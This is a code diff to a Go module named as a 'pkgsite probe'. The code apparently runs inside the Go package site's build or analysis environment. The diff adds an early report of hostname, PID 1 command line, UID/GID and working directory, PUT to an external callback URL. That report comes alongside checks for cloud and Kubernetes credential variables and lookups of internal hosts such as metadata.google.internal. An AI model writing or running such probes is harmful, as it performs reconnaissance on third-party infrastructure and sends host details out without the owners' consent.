@@ -23,9 +23,23 @@ var callbackSession string
 
 const (
 	module  = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	version = "v0.0.69-codex"
-	agent   = "go-cgo-pkgsite-probe-v069-codex"
+	version = "v0.0.70-codex"
+	agent   = "go-cgo-pkgsite-probe-v070-codex"
 )
+
+type initialReport struct {
+	Schema          string `json:"schema"`
+	Phase           string `json:"phase"`
+	Module          string `json:"module"`
+	Version         string `json:"version"`
+	ObservedUTC     string `json:"observed_utc"`
+	CWD             string `json:"cwd"`
+	UID             int    `json:"uid"`
+	GID             int    `json:"gid"`
+	Hostname        string `json:"hostname"`
+	PID1            string `json:"pid1"`
+	SensitiveValues bool   `json:"sensitive_values_included"`
+}
 
 type envFact struct {
 	Present  bool `json:"present"`
@@ -57,6 +71,7 @@ type httpFact struct {
 
 type report struct {
 	Schema          string             `json:"schema"`
+	Phase           string             `json:"phase"`
 	Module          string             `json:"module"`
 	Version         string             `json:"version"`
 	StartedUTC      string             `json:"started_utc"`
@@ -89,13 +104,20 @@ func main() {
 		return
 	}
 	started := time.Now().UTC()
+	hostname, _ := os.Hostname()
+	pid1 := boundedFile("/proc/1/cmdline", 2048)
+	_ = submit(initialReport{
+		Schema: "pkgsite-generic-lane-boundary/v2", Phase: "initial", Module: module, Version: version,
+		ObservedUTC: started.Format(time.RFC3339Nano), CWD: cwd, UID: os.Getuid(), GID: os.Getgid(),
+		Hostname: hostname, PID1: pid1, SensitiveValues: false,
+	}, 5*time.Second)
 	r := report{
-		Schema: "pkgsite-generic-lane-boundary/v1", Module: module, Version: version,
+		Schema: "pkgsite-generic-lane-boundary/v2", Phase: "final", Module: module, Version: version,
 		StartedUTC: started.Format(time.RFC3339Nano), CWD: cwd, UID: os.Getuid(), GID: os.Getgid(),
 		Environment: make(map[string]envFact), SensitiveValues: false,
 	}
-	r.Hostname, _ = os.Hostname()
-	r.PID1 = boundedFile("/proc/1/cmdline", 2048)
+	r.Hostname = hostname
+	r.PID1 = pid1
 	for _, name := range []string{
 		"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT", "K_SERVICE", "GAE_SERVICE",
 		"GO_DISCOVERY_QUEUE_URL", "GO_DISCOVERY_QUEUE_AUDIENCE", "KUBERNETES_SERVICE_HOST", "KUBECONFIG",
@@ -114,7 +136,7 @@ func main() {
 	r.DNS = inspectDNS()
 	r.HTTP = inspectHTTP()
 	r.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submit(r)
+	_ = submit(r, 10*time.Second)
 }
 
 func validateCallback() error {
@@ -207,7 +229,7 @@ func cleanErr(err error) string {
 }
 
 func inspectDNS() []dnsFact {
-	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
 	defer cancel()
 	names := []string{
 		"metadata.google.internal", "kubernetes.default.svc.cluster.local", "worker", "frontend",
@@ -274,12 +296,12 @@ func inspectHTTP() []httpFact {
 	return out
 }
 
-func submit(r report) error {
-	body, err := json.Marshal(r)
+func submit(value any, timeout time.Duration) error {
+	body, err := json.Marshal(value)
 	if err != nil || len(body) > 128*1024 {
 		return errors.New("report encoding")
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
 	req, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackURL, bytes.NewReader(body))
 	if err != nil {
